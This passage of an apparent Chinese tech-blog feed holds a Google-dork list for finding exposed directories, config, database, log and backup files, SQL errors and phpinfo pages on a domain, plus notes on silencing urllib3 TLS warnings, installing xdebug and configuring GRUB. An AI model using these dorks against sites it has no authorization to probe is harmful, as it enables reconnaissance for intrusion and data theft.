    <tags>
      
      <tag>Code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>google hacking web常用语法收集</title>
    <link href="/2018/05/28/2018-05-28-google-hacking-usual-statement/"/>
    <url>/2018/05/28/2018-05-28-google-hacking-usual-statement/</url>
    
    <content type="html"><![CDATA[<h1 id="google-hacking-web常用语法收集"><a href="#google-hacking-web常用语法收集" class="headerlink" title="google hacking web常用语法收集"></a>google hacking web常用语法收集</h1><hr><h1 id="谷歌hacking语法常用信息收集"><a href="#谷歌hacking语法常用信息收集" class="headerlink" title="谷歌hacking语法常用信息收集"></a>谷歌hacking语法常用信息收集</h1><h2 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h2><p>语法为: site:域名 intitle:index.of</p><h2 id="配置文件泄露"><a href="#配置文件泄露" class="headerlink" title="配置文件泄露"></a>配置文件泄露</h2><p>语法为: site:域名 ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:ini</p><h2 id="数据库文件泄露"><a href="#数据库文件泄露" class="headerlink" title="数据库文件泄露"></a>数据库文件泄露</h2><p>site:域名 ext:sql | ext:dbf | ext:mdb</p><h2 id="日志文件泄露"><a href="#日志文件泄露" class="headerlink" title="日志文件泄露"></a>日志文件泄露</h2><p>site:域名 ext:log</p><h2 id="备份和历史文件"><a href="#备份和历史文件" class="headerlink" title="备份和历史文件"></a>备份和历史文件</h2><p>site:域名 ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup</p><h2 id="SQL错误"><a href="#SQL错误" class="headerlink" title="SQL错误"></a>SQL错误</h2><p>site:域名 intext:”sql syntax near” | intext:”syntax error has occurred” | intext:”incorrect syntax near” | intext:”unexpected end of SQL command” | intext:”Warning: mysql_connect()” | intext:”Warning: mysql_query()” | intext:”Warning: pg_connect()”</p><h2 id="公开文件信息"><a href="#公开文件信息" class="headerlink" title="公开文件信息"></a>公开文件信息</h2><p>site:域名 ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv | ext:xml</p><h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo()"></a>phpinfo()</h2><p>site:域名 ext:php intitle:phpinfo “published by the PHP Group”</p><hr><p>以上仅仅是自己学习总结的资料，有什么不足请及时联系本人，欢迎一起交流。</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>php</category>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>google</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解决Python3 控制台输出InsecureRequestWarning的问题</title>
    <link href="/2018/05/28/2018-05-28-terminal-output-InsecureRequestWarning/"/>
    <url>/2018/05/28/2018-05-28-terminal-output-InsecureRequestWarning/</url>
    
    <content type="html"><![CDATA[<h1 id="google-hacking-web常用语法收集"><a href="#google-hacking-web常用语法收集" class="headerlink" title="google hacking web常用语法收集"></a>google hacking web常用语法收集</h1><hr><h2 id="解决Python3-控制台输出InsecureRequestWarning的问题"><a href="#解决Python3-控制台输出InsecureRequestWarning的问题" class="headerlink" title="解决Python3 控制台输出InsecureRequestWarning的问题"></a>解决Python3 控制台输出InsecureRequestWarning的问题</h2><p>问题：</p><p>使用Python3 requests发送HTTPS请求，已经关闭认证（verify=False）情况下，控制台会输出以下错误：</p><pre><code class="hljs vim">InsecureRequestWarnin<span class="hljs-variable">g:</span> Unverified HTTPS request <span class="hljs-keyword">is</span> being made. Adding certificate verification <span class="hljs-keyword">is</span> strongly advised. See: http<span class="hljs-variable">s:</span>//urllib3.readthedocs.io/<span class="hljs-keyword">en</span>/latest/advanced-usage.html#ssl-warnings</code></pre><p>解决方法：</p><p>在代码中添加以下代码即可解决：</p><pre><code class="hljs css"><span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">urllib3</span><span class="hljs-selector-tag">urllib3</span><span class="hljs-selector-class">.disable_warnings</span>(<span class="hljs-selector-tag">urllib3</span><span class="hljs-selector-class">.exceptions</span><span class="hljs-selector-class">.InsecureRequestWarning</span>)</code></pre><p>Python2添加如下代码即可解决：</p><pre><code class="hljs css"><span class="hljs-selector-tag">from</span> <span class="hljs-selector-tag">requests</span><span class="hljs-selector-class">.packages</span><span class="hljs-selector-class">.urllib3</span><span class="hljs-selector-class">.exceptions</span> <span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">InsecureRequestWarning</span># 禁用安全请求警告<span class="hljs-selector-tag">requests</span><span class="hljs-selector-class">.packages</span><span class="hljs-selector-class">.urllib3</span><span class="hljs-selector-class">.disable_warnings</span>(<span class="hljs-selector-tag">InsecureRequestWarning</span>)</code></pre><p>摘自：（<a href="https://www.cnblogs.com/ernana/p/8601789.html）" target="_blank" rel="noopener">https://www.cnblogs.com/ernana/p/8601789.html）</a></p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>urllib3</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ubuntu 安装php7.0 xdebug</title>
    <link href="/2018/05/18/2018-05-18-php-install-xdebug/"/>
    <url>/2018/05/18/2018-05-18-php-install-xdebug/</url>
    
    <content type="html"><![CDATA[<h1 id="ubuntu-安装php-xdebug"><a href="#ubuntu-安装php-xdebug" class="headerlink" title="ubuntu 安装php xdebug"></a>ubuntu 安装php xdebug</h1><hr><p>环境:ubuntu 17.04<br>php:7.0<br>xdebug:2.7.0<br>官方指导教程:(<a href="https://xdebug.org/wizard.php" target="_blank" rel="noopener">https://xdebug.org/wizard.php</a>)</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>(xdebug 官网<a href="https://xdebug.org/" target="_blank" rel="noopener">https://xdebug.org/</a>)<br>需要下载xdebug进行编译安装</p><pre><code>$ https://xdebug.org/files/xdebug-2.7.0alpha1.tgz#我这里下载的是2.7.0版本,可视情况下载</code></pre><p>解压文件</p><pre><code>$ tar -zxvf xdebug-2.7.0alpha1.tgz </code></pre><p>使用phpize进行编译(在xdebug目录下执行)</p><pre><code>$ phpize# 如果没有phpize,请安装php7.0-dev$ ./configure --enable-xdebug $ make$ sudo make install</code></pre><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>官方给出的配置信息太模糊,需要根据实际情况进行配置<br>不要编辑<code>/etc/php/7.0/cli/php.ini</code>和添加 <code>zend_extension = /usr/lib/php/20151012/xdebug.so</code></p><p>创建xdebug.ini</p><pre><code>$sudo vim /etc/php/7.0/mods-available/xdebug.ini</code></pre><pre><code class="hljs ini"><span class="hljs-attr">zend_extension</span>=xdebug.so <span class="hljs-attr">xdebug.remote_enable</span> = <span class="hljs-number">1</span><span class="hljs-attr">xdebug.remote_connect_back</span>=<span class="hljs-number">1</span><span class="hljs-attr">xdebug.remote_port</span> = <span class="hljs-number">9000</span><span class="hljs-attr">xdebug.scream</span>=<span class="hljs-number">1</span><span class="hljs-attr">xdebug.show_local_vars</span>=<span class="hljs-number">1</span><span class="hljs-attr">xdebug.idekey</span>=netbeans-xdebug <span class="hljs-comment">;To remove limits for xdebug_var_dump()</span> <span class="hljs-comment">;xdebug.var_display_max_depth = 5</span><span class="hljs-comment">;xdebug.var_display_max_children = 256</span><span class="hljs-comment">;xdebug.var_display_max_data = 1024 </span> <span class="hljs-attr">xdebug.var_display_max_depth</span> = -<span class="hljs-number">1</span> <span class="hljs-attr">xdebug.var_display_max_children</span> = -<span class="hljs-number">1</span><span class="hljs-attr">xdebug.var_display_max_data</span> = -<span class="hljs-number">1</span></code></pre><p>启用xdebug</p><pre><code>$sudo phpenmod xdebug</code></pre><p>如果你使用composer,或许需要禁用xdebug在cli下:</p><pre><code>sudo phpdismod -s cli xdebug</code></pre>]]></content>
    
    
    <categories>
      
      <category>code</category>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>grub多系统引导</title>
    <link href="/2018/05/15/2018-05-15-grub-guide-os/"/>
    <url>/2018/05/15/2018-05-15-grub-guide-os/</url>
    
    <content type="html"><![CDATA[<p>grub多系统引导</p><p>摘要： GRUB是多系统引导管理器，简单的说既能引导Linux，同时也能引导Windows；从讨论区近四年的观察来看，大多初学者并不能在短时间内掌握GRUB的用法，为了解决初学者在最短时间内掌握GRUB，重写GRUB入门文档还是有必要的；<br>本文重点介绍了GRUB的menu.lst的写法，另外通过GRUB命令行引导系统也做了详述；这些无论是对Windows版本的WINGRUB还是Linux版本的GRUB都是适用的；</p><hr><h1 id="一、什么是多重操作系统引导管理器，什么是GRUB；"><a href="#一、什么是多重操作系统引导管理器，什么是GRUB；" class="headerlink" title="一、什么是多重操作系统引导管理器，什么是GRUB；"></a>一、什么是多重操作系统引导管理器，什么是GRUB；</h1><h2 id="1、什么是多重操作系统引导管理器及工作原理；"><a href="#1、什么是多重操作系统引导管理器及工作原理；" class="headerlink" title="1、什么是多重操作系统引导管理器及工作原理；"></a>1、什么是多重操作系统引导管理器及工作原理；</h2><p>系统启动引导管理器，是在计算机启动后运行的第一个程序，他是用来负责加载、传输控制到操作系统的内核，一旦把内核挂载，系统引导管理器的任务就算完成退出，系统引导的其它部份，比如系统的初始化及启动过程则完全由内核来控制完成；<br /></p><p>Briefly, boot loader is the first software program that runs when a computer starts. It is responsible for loading and transferring control to the operating system kernel software (such as the Hurd or the Linux). The kernel, in turn, initializes the rest of the operating system (e.g. GNU). <br /></p><p>在X86 架构的机器中，Linux、BSD 或其它Unix类的操作系统中GRUB、LILO 是大家最为常用，应该说是主流；</p><p>Windows也有类似的工具NTLOADER；比如我们在机器中安装了Windows 98后，我们再安装一个Windows XP ，在机器启动的会有一个菜单让我们选择进入是进入Windows 98 还是进入Windows XP。NTLOADER就是一个多系统启动引导管理器，NTLOADER 同样也能引导Linux，只是极为麻烦罢了；</p><p>在Powerpc 架构的机器中，如果安装了Linux的Powerpc 版本，大多是用yaboot 多重引导管理器，比如Apple机目前用的是IBM Powerpc处理器，所以在如果想在Apple机上，安装Macos 和Linux Powerpc 版本，大多是用yaboot来引导多个操作系统；</p><p>因为目前X86架构的机器仍是主流， 所以目前GRUB和LILO 仍然是我们最常用的多重操作系统引导管理器；</p><h2 id="2、什么是GRUB；为什么我要选择GRUB；"><a href="#2、什么是GRUB；为什么我要选择GRUB；" class="headerlink" title="2、什么是GRUB；为什么我要选择GRUB；"></a>2、什么是GRUB；为什么我要选择GRUB；</h2><h3 id="1）什么是GRUB；"><a href="#1）什么是GRUB；" class="headerlink" title="1）什么是GRUB；"></a>1）什么是GRUB；</h3><p>GNU GRUB 是一个多重操作系统启动管理器。GNU GRUB 是由GRUB（GRand Unified Bootloader） 派生而来。GRUB 最初由Erich Stefan Boleyn 设计和应用；</p><p>GNU GRUB is a Multiboot boot loader. It was derived from GRUB, GRand Unified Bootloader, which was originally designed and implemented by Erich Stefan Boleyn.</p><h3 id="2）“GRUB太不好用”──对GRUB的认识的误区；"><a href="#2）“GRUB太不好用”──对GRUB的认识的误区；" class="headerlink" title="2）“GRUB太不好用”──对GRUB的认识的误区；"></a>2）“GRUB太不好用”──对GRUB的认识的误区；</h3><p>GRUB真的不好用吗？不是的，通过LinuxSir.Org 社区近四年来的运行，我发现了大多新手弟兄还是不太了解GRUB；当然这也有中文Linux社区的责任，虽然也有GRUB的中文译本，初学Linux的弟兄可能有点看不懂；</p><p>我们欣喜的看到LinuxSir.Org 社区的好多弟兄都曾经或正在写GRUB实践文档，也有的弟兄也总结了GRUB的一些基础知识，比如 probing兄弟的 《GRUB 学习笔记》；由于每个人的写文档时风格不同，可能同一份文档不同的人来写就有不同的风格；所以今天也抖胆也一篇入门级的教程，由于北南不会写高级教程，所以还得请高手弟兄指教，先谢过；</p><h3 id="3）为什么要选择GRUB；"><a href="#3）为什么要选择GRUB；" class="headerlink" title="3）为什么要选择GRUB；"></a>3）为什么要选择GRUB；</h3><p>基于在X86架构的CPU而开发操作系统，系统引导管理器不仅仅有GRUB ，而且也有LILO，但对于多重系统引导管理器，你只能选择其一而用；不能两个同时使用；</p><p>目前这两个多重系统引导管理器是大家最常用的，也是主流Linux发行版而采用的；有的弟兄喜欢GRUB，比如我个人，有的弟兄喜欢LILO ，比如etony兄（谁是etony，请参见 <a href="http://debian.linuxsir.org" target="_blank" rel="noopener">http://debian.linuxsir.org</a> ）；</p><p>主流发行版 Fedora、Redhat、Centos等基于RPM包的系统，在最新版本中都默认GRUB引导；Slackware 目前仍采用LILO；而Debian发行版目前最新的版本也是采用GRUB；</p><p>从目前看来，GRUB有逐渐取代LILO之势，GRUB 2.0正在开发之中；所以我们有理由用GRUB，我也有理由写GRUB使用教程；</p><h1 id="二、GRUB软件包版本选择和安装；"><a href="#二、GRUB软件包版本选择和安装；" class="headerlink" title="二、GRUB软件包版本选择和安装；"></a>二、GRUB软件包版本选择和安装；</h1><h2 id="1、GRUB的版本选择，Linux版本的GRUB及Windows版本的GRUB的说明；"><a href="#1、GRUB的版本选择，Linux版本的GRUB及Windows版本的GRUB的说明；" class="headerlink" title="1、GRUB的版本选择，Linux版本的GRUB及Windows版本的GRUB的说明；"></a>1、GRUB的版本选择，Linux版本的GRUB及Windows版本的GRUB的说明；</h2><p>GRUB不但有Linux版本，也有Windows版本；现我们一一介绍；</p><p>如前面所说，目前在在Unix类的操作系统中，大多是都有GRUB；GRUB几乎能引导所有X86架构的操作系统；功能之强，使用简单是GRUB最大的卖点；由于Windows 操作系统的先入为主的优势，使得大家对Windows的NTLOADER了解的比较多，而对开源社区的GRUB显得有点寞生，由此而带来使用上的“心理恐惧”；究其初学者对GRUB“恐惧”的主要原因还是对GRUB没有太多的了解和深入；无论是WINGRUB还是Linux版本的GRUB，最方便的还是对 GRUB命令行的操作；一谈到命令行（Command）的操作，可能初学者对此恐惧；其实没有什么难的，象北南这样低级的写手，还能操作得起来，您也应该能行；</p><h2 id="2、GRUB的Windows版本WINGRUB；"><a href="#2、GRUB的Windows版本WINGRUB；" class="headerlink" title="2、GRUB的Windows版本WINGRUB；"></a>2、GRUB的Windows版本WINGRUB；</h2><p>请参考：《以WINGRUB 引导安装Fedora 4.0 为例，详述用WINGRUB来引导Linux的安装》</p><h2 id="3、GRUB的Linux版本软件包的安装；"><a href="#3、GRUB的Linux版本软件包的安装；" class="headerlink" title="3、GRUB的Linux版本软件包的安装；"></a>3、GRUB的Linux版本软件包的安装；</h2><p>其实对于Linux的GRUB，几乎所有的Linux主流发行版都有打包，如果您安装了Linux，并且在开机后出现GRUB字样的，证明您已经安装了GRUB；而无需再次安装；Linux的GRUB软件包安装部份并不是本文的重点；</p><p>如果您的Linux系统没有安装GRUB，或者采用的是LILO，而您想用GRUB，可以用系统安装盘自带GRUB软件包来安装，或者到相关发行版本的软件仓库下载后安装；</p><p>GRUB 的Linux版本目前在各大发行版中都有打包；比如Fedora/Redhat/Centos/Mandrive/Mandriva/SuSE等以RPM包管理机制的系统，可以通过如下的命令来安装；</p><p>请参考《Fedora / Redhat 软件包管理指南》</p><pre><code>[root@localhost ~]# rpm -ivh grub*.rpm</code></pre><p>如果是Slackware 您可以用如下的办法来安装；</p><pre><code>[root@localhost ~]# installpkg grub*.tgz</code></pre><p>其它的发行版本请用其自己特色的软件包管理工具来安装；</p><p>当然您也可以通过源码包，在任何Linux的发行版上安装；至于源码包的安装方法；</p><p>请参考：《如何编译安装源码包软件》</p><pre><code class="hljs autoit">[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta">#tar zxvf grub*.tar.gz</span>[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta">#cd grub-xxx</span>[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta">#./configure<span class="hljs-comment">;make;make install</span></span></code></pre><p>确认您是否成功安装了GRUB，您可以测试是否有如下两个命令；</p><pre><code class="hljs autoit">[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># grub</span>[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># grub-install</span></code></pre><p>如果您不能找到这两个命令，可能您的可执行程序的路径没有设置；</p><p>请参考：《设置可执行程序路径》，当然您可以用绝对路径；比如下面的；</p><pre><code class="hljs autoit">[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># /usr/sbin/grub</span>[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># /usr/sbin/grub-install</span></code></pre><p>如果您还是找不到GRUB软件包安装在哪了；您可以用下面的命令来解决和查找；</p><pre><code class="hljs autoit">[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># updatedb  注：这个要花很长时间；是索引slocate 的库，然后再通过locate来查找；</span>[root<span class="hljs-symbol">@localhost</span> ~]<span class="hljs-meta"># locate grub</span></code></pre><p>比如找到的是有类似如下的；</p><pre><code class="hljs awk">[root@localhost ~]<span class="hljs-comment"># locate grub</span><span class="hljs-regexp">/sbin/g</span>rub-md5-crypt<span class="hljs-regexp">/sbin/g</span>rub<span class="hljs-regexp">/sbin/g</span>rub-install<span class="hljs-regexp">/sbin/g</span>rub-terminfo</code></pre><p>在一般情况下，在路径中带有bin或sbin中字样的，这些路径下都是可执行程序；sbin 是超级权限用户才能使用的管理命令；要使用这些命令一般的情况下得切换到root用户下才能使用；比如</p><pre><code class="hljs elixir">[beinan<span class="hljs-variable">@localhost</span> ~]<span class="hljs-variable">$ </span>su -  注：切换到root用户，并且切换到其家目录；<span class="hljs-symbol">Password:</span>[root<span class="hljs-variable">@localhost</span> ~]<span class="hljs-comment">#/sbin/grub  注：用绝对路径来运行grub命令；</span></code></pre><h1 id="三、在Linux中，GRUB的配置中的安装和写入硬盘的MBR；"><a href="#三、在Linux中，GRUB的配置中的安装和写入硬盘的MBR；" class="headerlink" title="三、在Linux中，GRUB的配置中的安装和写入硬盘的MBR；"></a>三、在Linux中，GRUB的配置中的安装和写入硬盘的MBR；</h1><h2 id="1、在Linux中，GRUB配置过程中的安装grub-install；"><a href="#1、在Linux中，GRUB配置过程中的安装grub-install；" class="headerlink" title="1、在Linux中，GRUB配置过程中的安装grub-install；"></a>1、在Linux中，GRUB配置过程中的安装grub-install；</h2><p>grub-install 命令有何用呢？其实就是把我们前面已经安装的软件包中的一些文件复制到 /boot/grub中；对于新安装GRUB软件包后，也是一个必经的过程；我们前面所说的GRUB软件包的安装；而现在我们说的是GRUB配置的过程中的安装；虽然在洋文中都是install ，但表达的意思是不一样的；</p><p>我们首先要运行 fdisk -l 来确认到底是硬盘的标识；</p><p>这个过程主要是确认硬盘的标识是哪个调备，到底是/dev/hda还是/dev/hdb 还是其它的；</p><pre><code class="hljs angelscript">[<span class="hljs-symbol">root@</span>localhost ~]# fdisk -lDisk /dev/hda: <span class="hljs-number">80.0</span> GB, <span class="hljs-number">80026361856</span> bytes<span class="hljs-number">255</span> heads, <span class="hljs-number">63</span> sectors/track, <span class="hljs-number">9729</span> cylindersUnits = cylinders of <span class="hljs-number">16065</span> * <span class="hljs-number">512</span> = <span class="hljs-number">8225280</span> bytes   Device Boot      Start         End      Blocks   Id  System/dev/hda1   *           <span class="hljs-number">1</span>         <span class="hljs-number">970</span>     <span class="hljs-number">7791493</span>+   <span class="hljs-number">7</span>  HPFS/NTFS/dev/hda2             <span class="hljs-number">971</span>        <span class="hljs-number">9729</span>    <span class="hljs-number">70356667</span>+   <span class="hljs-number">5</span>  Extended/dev/hda5             <span class="hljs-number">971</span>        <span class="hljs-number">2915</span>    <span class="hljs-number">15623181</span>    b  W95 FAT32/dev/hda6            <span class="hljs-number">2916</span>        <span class="hljs-number">4131</span>     <span class="hljs-number">9767488</span>+  <span class="hljs-number">83</span>  Linux/dev/hda7            <span class="hljs-number">4132</span>        <span class="hljs-number">5590</span>    <span class="hljs-number">11719386</span>   <span class="hljs-number">83</span>  Linux/dev/hda8            <span class="hljs-number">5591</span>        <span class="hljs-number">6806</span>     <span class="hljs-number">9767488</span>+  <span class="hljs-number">83</span>  Linux/dev/hda9            <span class="hljs-number">6807</span>        <span class="hljs-number">9657</span>    <span class="hljs-number">22900626</span>   <span class="hljs-number">83</span>  Linux/dev/hda10           <span class="hljs-number">9658</span>        <span class="hljs-number">9729</span>      <span class="hljs-number">578308</span>+  <span class="hljs-number">82</span>  Linux swap / Solaris</code></pre><p>如果通过fdisk -l 出现有/dev/hda字样的，我们就要用下面的命令来安装；</p><pre><code class="hljs routeros">[root@localhost ~]# grub-install /dev/hdaInstallation finished. <span class="hljs-literal">No</span> <span class="hljs-builtin-name">error</span> reported.This is the contents of the device map /boot/grub/device.map.Check <span class="hljs-keyword">if</span> this is correct <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span>. <span class="hljs-keyword">If</span> any of the lines is incorrect,fix it <span class="hljs-keyword">and</span> re-<span class="hljs-builtin-name">run</span> the<span class="hljs-built_in"> script </span>`grub-install<span class="hljs-string">'.</span><span class="hljs-string"></span><span class="hljs-string">(fd0)   /dev/fd0</span><span class="hljs-string">(hd0)   /dev/hda</span></code></pre><p>如果是您fdisk -l 出现的有/dev/hdb呢，那就如下运行；</p><pre><code>[root@localhost ~]# grub-install /dev/hdb</code></pre><p>如果既有/dev/hda和/dev/hdb 就安装到/dev/hda中；</p><pre><code>[root@localhost ~]# grub-install /dev/hda</code></pre><p>值得注意的是如果您有一个/boot分区，应该用如下的办法来安装；</p><pre><code>[root@localhost ~]#grub-install --root-directory=/boot /dev/hda[root@localhost ~]#grub-install --root-directory=/boot /dev/hdb</code></pre><p>注解：具体是/dev/hda还是/dev/hdb，请以fdisk -l 为准；如果两个都有，就看您把/boot分区是放在第一块硬盘还是第二块硬盘上了，以实际情况为准；</p><h2 id="2、设定GRUB的-boot分区并写入MBR；；"><a href="#2、设定GRUB的-boot分区并写入MBR；；" class="headerlink" title="2、设定GRUB的/boot分区并写入MBR；；"></a>2、设定GRUB的/boot分区并写入MBR；；</h2><p>在Linux中，GRUB软件包的安装，及在配置过程中安装grub到 /boot中还是不够的， 还要把GRUB，写入MBR才行；有时我们重新安装了Windows，Windows会把MBR 重写，这样GRUB就消失了；如果您出现这样的情况，就要进行这个过程；</p><pre><code>[root@localhost ~]# grub</code></pre><p>会出现grub&gt;提示符，这是grub命令行模式 ，如果能在开机中出现提示符，没有引导不起来的系统，除非您的系统破坏的极为严重。如果仅仅是GRUB被破坏了，GRUB命令行是能让操作系统引导起来的；</p><p>接着看例子，我们要找到 /boot/grub/stage1的，在grub&gt;后面输入；</p><pre><code class="hljs less"><span class="hljs-selector-tag">grub</span>&gt; <span class="hljs-selector-tag">find</span>  /<span class="hljs-selector-tag">boot</span>/<span class="hljs-selector-tag">grub</span>/<span class="hljs-selector-tag">stage1</span>(hd0,<span class="hljs-number">6</span>) (fd0)   注：这个是软驱；现在很少用软驱了，如果您有这方面的需要，自己看<span class="hljs-selector-tag">GRUB</span>的<span class="hljs-selector-tag">DOC</span>吧；</code></pre><p>注解：</p><p>(hd0,6) 这是/boot所在的分区；不要误解为是Linux 的/所在的分区，这是值得注意的；<br>(fd0) 注：这个是软驱；现在很少用软驱了，如果您有这方面的需要，自己看GRUB的DOC吧；</p><pre><code class="hljs gcode">grub&gt;root <span class="hljs-comment">(hd0,6)</span>    注：这是/boot所在的分区；grub&gt;setup <span class="hljs-comment">(hd0)</span>   注：把GRUB写到MBR上；</code></pre><p>注解：</p><p>上面这步骤是根据 find /boot/stage1而来的，仔细看一下就明白了；现在我们一般安装很少会把/boot分区列为一个单独的分区；不过有的弟兄可能也喜欢这么做；所以还是有必要说一下为好；</p><h1 id="四、GRUB的配置文件的menu-lst的写法；"><a href="#四、GRUB的配置文件的menu-lst的写法；" class="headerlink" title="四、GRUB的配置文件的menu.lst的写法；"></a>四、GRUB的配置文件的menu.lst的写法；</h1><p>对于GRUB来说，如果没有配置menu.lst，无论是Linux版本的GRUB，还是WINGRUB，都会有命令行可用，通过命令行是一样能把操作系统引导起来的；有些弟兄总以为menu.lst 配置错了， 或者在机器启动后出现grub&gt;命令行模式就要重新安装系统，其实根本没有这个必要；只要学会GRUB的命令行的用法，根本没有必要重装系统；</p><p>menu.lst 位于/boot/grub目录中，也就是/boot/grub/menu.lst 文件；您可以用vi或您喜欢的编辑器来编辑他；如果您不会用vi，还是去学习一下吧；简单的用法怎么也得会，对不对？毕竟这个文档不是讲vi的用法的；</p><p>有的弟兄会说，我没有menu.lst怎么办？那就创建一个；用下面的命令；</p><pre><code>[root@localhost ~]# touch  /boot/grub/menu.lst</code></pre><p>然后我们再做一个/boot/grub/menu.lst 的链接 /boot/grub/grub.conf</p><pre><code>[root@localhost ~]# cd /boot/grub[root@localhost ~]# ln -s menu.lst grub.conf</code></pre><p>现在我们来写GRUB的menu.lst了，因为/boot/grub/grub.conf是 /boot/grub/menu.lst的链接文件，改哪个都行。链接文件相当于Windows的快捷方式，这样可能能更好的理解；</p><h2 id="1、menu-lst的写法之一；"><a href="#1、menu-lst的写法之一；" class="headerlink" title="1、menu.lst的写法之一；"></a>1、menu.lst的写法之一；</h2><p>首先我们看一下我的Fedora 4.0 中的/boot/grub/menu.lst 的内容；</p><pre><code class="hljs lsl"><span class="hljs-section">default</span>=<span class="hljs-number">0</span>timeout=<span class="hljs-number">5</span>#splashimage=(hd0,<span class="hljs-number">6</span>)/boot/grub/splash.xpm.gzhiddenmenutitle Fedora Core (<span class="hljs-number">2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4)        root (hd0,<span class="hljs-number">6</span>)        kernel /boot/vmlinuz<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4 ro root=LABEL=/        initrd /boot/initrd<span class="hljs-number">-2.6</span><span class="hljs-number">.11</span><span class="hljs-number">-1.1369</span>_FC4.imgtitle WinXp        rootnoverify (hd0,<span class="hljs-number">0</span>)        chainloader +<span class="hljs-number">1</span></code></pre><p>注解：<br>default=0</p><p>default=0 是默认启动哪个系统，从0开始；每个操作系统的启动的定义都从title开始的，第一个title 在GRUB的启动菜单上显示为0,第二个启动为1，以此类推；<br>timeout=5</p><p>注：表示在开机后，GRUB画面出现几秒后开始以默认启动；如果在启动时，移动上下键，则解除这一规则；<br>    #splashimage=(hd0,6)/boot/grub/splash.xpm.gz 注：GRUB的背景画面，这个是可选项；我不喜欢GRUB的背景画面，所以加#号注掉，也可以删除；<br>hiddenmenu</p><p>注解：隐藏GRUB的启动菜单，这项也是可选的，也可以用#号注掉；</p><p>一般的情况下对Linux操作系统的启动，一般要包括四行；title 行；root行；kernel 行；initrd 行；</p><h3 id="1）在menu-lst中-，通过-root-hd-0-n-y-来指定-boot-所在的分区；"><a href="#1）在menu-lst中-，通过-root-hd-0-n-y-来指定-boot-所在的分区；" class="headerlink" title="1）在menu.lst中 ，通过 root (hd[0-n],y)来指定/boot 所在的分区；"></a>1）在menu.lst中 ，通过 root (hd[0-n],y)来指定/boot 所在的分区；</h3><p>title XXXXX 注：title 后面加一个空格，title 是小写的，后面可以自己定义；比如FC4，自己定义一个名字就行；<br>root (hd[0-n],y) ，在本例中，我们看到的是root (hd0,6) ,root (hd[0-n],y)表示的是/boot所在的分区；有时我们安装Linux的时候，大多是不设置/boot的，这时/boot和/所在的同一个分区； 这个root (hd[0-n],y)很重要，因为/boot目录中虽然有grub目录，最为重要的是还有kernel 和initrd文件，这是Linux能启动起来最为重要东西；</p><p>有的弟兄会问，root (hd[0-n],y)是怎么来的？</p><p>请参考：《在Linux系统中存储设备的两种表示方法》</p><h3 id="2）在menu-lst中，kernel-命令行的写法；"><a href="#2）在menu-lst中，kernel-命令行的写法；" class="headerlink" title="2）在menu.lst中，kernel 命令行的写法；"></a>2）在menu.lst中，kernel 命令行的写法；</h3><p>kernel 一行，是通指定内核及Linux的/分区所在位置；</p><p>比如例子中是；</p><pre><code>kernel /boot/vmlinuz-2.6.11-1.1369_FC4 ro root=LABEL=/</code></pre><p>在这里以kernel 起始，指定Linux的内核的文件所处的绝对路径；因为内核是处在/boot目录中的， 如果/boot是独立的一个分区，则需要把boot省略；如果/boot是独立的分区，这行要写成:</p><pre><code>kernel /vmlinuz-2.6.11-1.1369_FC4 ro root=LABEL=/ </code></pre><p>因为/boot所处的分区已经在title 下一行root (hd[0-n],y)中指定了，所以就无需要再指明内核处在哪个分区了；另外Linux系统的硬盘分区的挂载配置文件在/etc/fstab ，原理是通过 mount /dev/hd[a-z]X /boot 来进行的；您可以对照着来理解；</p><p>ro 表示只读； root=LABEL=/ 来表示Linux的根所处的分区。LABEL=/ 这是硬盘分区格式化为相应文件系统后所加的标签；如果您不了解什么是标签，也可以直接以/dev/hd[a-z]X 或者/dev/sd[a-z]X来表示；就看您的Linux是根分区是在哪个分区了。比如我的是在/dev/hda7 ， 那这里就可以写成root=/dev/hda7；</p><p>如果查看系统运行所挂载的分区，请用 df -lh 来查看，就能明白是不是/boot是独立的分区，或者查看/etc/fstab也能知道；</p><pre><code class="hljs angelscript">[<span class="hljs-symbol">root@</span>localhost ~]# df -lhFilesystem            容量  已用 可用 已用% 挂载点/dev/hda7              <span class="hljs-number">11</span>G  <span class="hljs-number">9.2</span>G  <span class="hljs-number">1.2</span>G  <span class="hljs-number">90</span>% //dev/shm              <span class="hljs-number">236</span>M     <span class="hljs-number">0</span>  <span class="hljs-number">236</span>M   <span class="hljs-number">0</span>% /dev/shm</code></pre><p>在这个例子中，我们可以发现 /boot并没有出现只有/dev/hda7，这表示/boot并不是独立的一个分区；所有的东西都包含在/中；于是我们在/boot中查看内核版本；</p><pre><code>[root@localhost ~]# ls 